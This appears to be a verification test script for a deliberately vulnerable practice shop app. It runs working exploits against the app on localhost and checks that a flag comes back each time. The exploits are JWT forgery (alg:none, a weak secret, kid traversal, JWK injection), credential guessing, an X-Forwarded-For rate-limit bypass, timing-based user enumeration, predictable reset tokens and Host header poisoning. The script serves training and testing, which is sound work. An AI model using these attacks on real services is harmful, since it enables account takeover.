const http = require('http');
const crypto = require('crypto');
const app = require('./src/server');

const PORT = 8004;

function base64UrlEncode(str) {
  return Buffer.from(str)
    .toString('base64')
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');
}

function request(options, postData = null) {
  return new Promise((resolve, reject) => {
    const req = http.request({ port: PORT, host: '127.0.0.1', ...options }, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(body);
          resolve({ status: res.statusCode, headers: res.headers, body: json, rawBody: body });
        } catch (_) {
          resolve({ status: res.statusCode, headers: res.headers, rawBody: body });
        }
      });
    });
    req.on('error', reject);
    if (postData) {
      if (typeof postData === 'string') {
        req.write(postData);
      } else {
        req.write(JSON.stringify(postData));
      }
    }
    req.end();
  });
}

function assert(condition, message) {
  if (!condition) {
    console.error(`❌ FAILED: ${message}`);
    process.exit(1);
  }
  console.log(`✅ PASSED: ${message}`);
}

async function runTests() {
  const server = app.listen(PORT, async () => {
    console.log(`\n=== Starting VulnShop CTF Verification Suite on port ${PORT} ===\n`);

    try {
      // 0. Healthcheck
      const health = await request({ path: '/health', method: 'GET' });
      assert(health.status === 200 && health.body.status === 'ok', 'Healthcheck GET /health returns 200 {"status": "ok"}');

      // ======================================================================
      // 1. EASY MODE TESTS
      // ======================================================================
      console.log('\n--- Testing EASY Mode ---');
      await request({
        path: '/api/difficulty',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, { difficulty: 'easy' });

      // Challenge 25: shop-auth-jwt-easy (alg: none)
      const noneHeader = base64UrlEncode(JSON.stringify({ alg: 'none', typ: 'JWT' }));
      const nonePayload = base64UrlEncode(JSON.stringify({ username: 'admin', role: 'admin' }));
      const noneToken = `${noneHeader}.${nonePayload}.`;

      const jwtEasyRes = await request({
        path: '/api/admin/dashboard',
        method: 'GET',
        headers: { 'Authorization': `Bearer ${noneToken}` }
      });
      assert(jwtEasyRes.status === 200, 'shop-auth-jwt-easy: alg: none accepted by /api/admin/dashboard');
      assert(jwtEasyRes.body.flag && jwtEasyRes.body.flag.startsWith('VULNLAB{'), `shop-auth-jwt-easy flag returned: ${jwtEasyRes.body.flag}`);

      // Challenge 28: shop-auth-bruteforce-easy (no rate limit, admin123)
      const bfEasyRes = await request({
        path: '/api/login',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, { username: 'admin', password: 'admin123' });
      assert(bfEasyRes.status === 200, 'shop-auth-bruteforce-easy: admin:admin123 login successful');
      assert(bfEasyRes.body.flag && bfEasyRes.body.flag.startsWith('VULNLAB{'), `shop-auth-bruteforce-easy flag returned: ${bfEasyRes.body.flag}`);

      // Challenge 31: shop-auth-reset-easy (predictable token: md5(username))
      await request({
        path: '/api/forgot-password',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, { username: 'admin' });

      const adminMd5 = crypto.createHash('md5').update('admin').digest('hex');
      const resetEasyRes = await request({
        path: '/api/reset-password',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, { token: adminMd5, newPassword: 'newAdminPassword123' });
      assert(resetEasyRes.status === 200, 'shop-auth-reset-easy: reset password with md5(admin) succeeds');
      assert(resetEasyRes.body.flag && resetEasyRes.body.flag.startsWith('VULNLAB{'), `shop-auth-reset-easy flag returned: ${resetEasyRes.body.flag}`);

      // ======================================================================
      // 2. MEDIUM MODE TESTS
      // ======================================================================
      console.log('\n--- Testing MEDIUM Mode ---');
      await request({
        path: '/api/difficulty',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, { difficulty: 'medium' });

      // Challenge 26: shop-auth-jwt-medium (weak dictionary secret "secret123")
      // First, confirm alg: none is rejected
      const noneInMediumRes = await request({
        path: '/api/admin/dashboard',
        method: 'GET',
        headers: { 'Authorization': `Bearer ${noneToken}` }
      });
      assert(noneInMediumRes.status === 401, 'shop-auth-jwt-medium: alg: none is properly rejected');

      // Now forge with weak secret "secret123"
      const medHeader = base64UrlEncode(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
      const medPayload = base64UrlEncode(JSON.stringify({ username: 'admin', role: 'admin' }));
      const medSig = crypto.createHmac('sha256', 'secret123').update(`${medHeader}.${medPayload}`).digest('base64url');
      const medToken = `${medHeader}.${medPayload}.${medSig}`;

      const jwtMedRes = await request({
        path: '/api/admin/dashboard',
        method: 'GET',
        headers: { 'Authorization': `Bearer ${medToken}` }
      });
      assert(jwtMedRes.status === 200, 'shop-auth-jwt-medium: JWT signed with weak secret "secret123" accepted');
      assert(jwtMedRes.body.flag && jwtMedRes.body.flag.startsWith('VULNLAB{'), `shop-auth-jwt-medium flag returned: ${jwtMedRes.body.flag}`);

      // Challenge 29: shop-auth-bruteforce-medium (Rate limiting + X-Forwarded-For bypass)
      // Send 5 failed attempts from same IP
      for (let i = 0; i < 5; i++) {
        await request({
          path: '/api/login',
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '192.168.1.50' }
        }, { username: 'admin', password: 'wrongpassword' });
      }
      // 6th attempt should hit rate limit (429)
      const blockedRes = await request({
        path: '/api/login',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '192.168.1.50' }
      }, { username: 'admin', password: 'wrongpassword' });
      assert(blockedRes.status === 429, 'shop-auth-bruteforce-medium: Rate limit blocks after 5 failed attempts (HTTP 429)');

      // Bypass with spoofed X-Forwarded-For header
      const bypassRes = await request({
        path: '/api/login',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '192.168.1.51' }
      }, { username: 'admin', password: 'admin123' });
      assert(bypassRes.status === 200, 'shop-auth-bruteforce-medium: X-Forwarded-For bypass succeeds with correct password');
      assert(bypassRes.body.flag && bypassRes.body.flag.startsWith('VULNLAB{'), `shop-auth-bruteforce-medium flag returned: ${bypassRes.body.flag}`);

      // Challenge 32: shop-auth-reset-medium (timestamp-based predictable token sha1(username + timestamp))
      const timeBefore = Math.floor(Date.now() / 1000);
      await request({
        path: '/api/forgot-password',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, { username: 'admin' });

      const timeAfter = Math.floor(Date.now() / 1000);
      let medResetFlag = null;
      for (let t = timeBefore - 1; t <= timeAfter + 1; t++) {
        const candidateToken = crypto.createHash('sha1').update('admin' + t).digest('hex');
        const tryReset = await request({
          path: '/api/reset-password',
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        }, { token: candidateToken, newPassword: 'medAdminPassword' });
        if (tryReset.status === 200 && tryReset.body.flag) {
          medResetFlag = tryReset.body.flag;
          break;
        }
      }
      assert(medResetFlag && medResetFlag.startsWith('VULNLAB{'), `shop-auth-reset-medium flag returned: ${medResetFlag}`);

      // ======================================================================
      // 3. HARD MODE TESTS
      // ======================================================================
      console.log('\n--- Testing HARD Mode ---');
      await request({
        path: '/api/difficulty',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, { difficulty: 'hard' });

      // Challenge 27: shop-auth-jwt-hard (kid traversal to /dev/null or jwk parameter)
      // Path A: kid parameter traversal to /dev/null (empty secret)
      const kidHeader = base64UrlEncode(JSON.stringify({ alg: 'HS256', typ: 'JWT', kid: '/dev/null' }));
      const kidPayload = base64UrlEncode(JSON.stringify({ username: 'admin', role: 'admin' }));
      const kidSig = crypto.createHmac('sha256', '').update(`${kidHeader}.${kidPayload}`).digest('base64url');
      const kidToken = `${kidHeader}.${kidPayload}.${kidSig}`;

      const jwtHardKidRes = await request({
        path: '/api/admin/dashboard',
        method: 'GET',
        headers: { 'Authorization': `Bearer ${kidToken}` }
      });
      assert(jwtHardKidRes.status === 200, 'shop-auth-jwt-hard: kid traversal to /dev/null accepted');
      assert(jwtHardKidRes.body.flag && jwtHardKidRes.body.flag.startsWith('VULNLAB{'), `shop-auth-jwt-hard (kid) flag returned: ${jwtHardKidRes.body.flag}`);

      // Path B: jwk embedded key parameter injection
      const attackerSecret = 'myAttackerSecretKey123';
      const jwkHeader = base64UrlEncode(JSON.stringify({
        alg: 'HS256',
        typ: 'JWT',
        jwk: { kty: 'oct', k: Buffer.from(attackerSecret).toString('base64') }
      }));
      const jwkSig = crypto.createHmac('sha256', attackerSecret).update(`${jwkHeader}.${kidPayload}`).digest('base64url');
      const jwkToken = `${jwkHeader}.${kidPayload}.${jwkSig}`;

      const jwtHardJwkRes = await request({
        path: '/api/admin/dashboard',
        method: 'GET',
        headers: { 'Authorization': `Bearer ${jwkToken}` }
      });
      assert(jwtHardJwkRes.status === 200, 'shop-auth-jwt-hard: embedded JWK parameter injection accepted');

      // Challenge 30: shop-auth-bruteforce-hard (Timing discrepancy & support user login)
      // Test timing difference: nonexistent user (<50ms) vs valid user (~250ms)
      const t0 = Date.now();
      await request({
        path: '/api/login',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '10.10.10.1' }
      }, { username: 'nonexistent_user_xyz', password: 'randompassword' });
      const nonExistTime = Date.now() - t0;

      const t1 = Date.now();
      await request({
        path: '/api/login',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '10.10.10.2' }
      }, { username: 'support', password: 'wrongpassword' });
      const existTime = Date.now() - t1;

      console.log(`  Timing check: non-existent user took ${nonExistTime}ms, existing user took ${existTime}ms`);
      assert(existTime > 150, 'shop-auth-bruteforce-hard: Timing discrepancy observed on valid user (>= 150ms)');

      // Log in as support with dictionary password "welcome123"
      const bfHardRes = await request({
        path: '/api/login',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '10.10.10.3' }
      }, { username: 'support', password: 'welcome123' });
      assert(bfHardRes.status === 200, 'shop-auth-bruteforce-hard: support:welcome123 login successful');
      assert(bfHardRes.body.flag && bfHardRes.body.flag.startsWith('VULNLAB{'), `shop-auth-bruteforce-hard flag returned: ${bfHardRes.body.flag}`);

      // Challenge 33: shop-auth-reset-hard (Host header poisoning)
      // Send forgot-password with poisoned Host header
      await request({
        path: '/api/forgot-password',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Host': 'attacker-controlled-server.com',
          'X-Forwarded-Host': 'attacker-controlled-server.com'
        }
      }, { username: 'admin' });

      // Inspect simulated outbox
      const emailRes = await request({ path: '/api/emails', method: 'GET' });
      assert(emailRes.status === 200 && emailRes.body.emails.length > 0, 'shop-auth-reset-hard: Email logged to simulated outbox');
      const latestEmail = emailRes.body.emails[0];
      assert(latestEmail.host === 'attacker-controlled-server.com', 'shop-auth-reset-hard: Host header successfully poisoned');

      // Extract poisoned token from resetLink
      const match = latestEmail.resetLink.match(/token=([0-9a-f]+)/i);
      assert(match && match[1], 'shop-auth-reset-hard: Token extracted from poisoned reset link');
      const poisonedToken = match[1];

      // Submit poisoned reset token
      const resetHardRes = await request({
        path: '/api/reset-password',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, { token: poisonedToken, newPassword: 'hardPoisonedPassword123' });
      assert(resetHardRes.status === 200, 'shop-auth-reset-hard: Password reset with poisoned token succeeds');
      assert(resetHardRes.body.flag && resetHardRes.body.flag.startsWith('VULNLAB{'), `shop-auth-reset-hard flag returned: ${resetHardRes.body.flag}`);

      console.log('\n🎉 ALL 9 VULNERABILITIES AND CHALLENGES VERIFIED SUCCESSFULLY! 🎉\n');
      server.close();
      process.exit(0);
    } catch (err) {
      console.error('\n❌ Unexpected error during verification:', err);
      server.close();
      process.exit(1);
    }
  });
}

runTests();
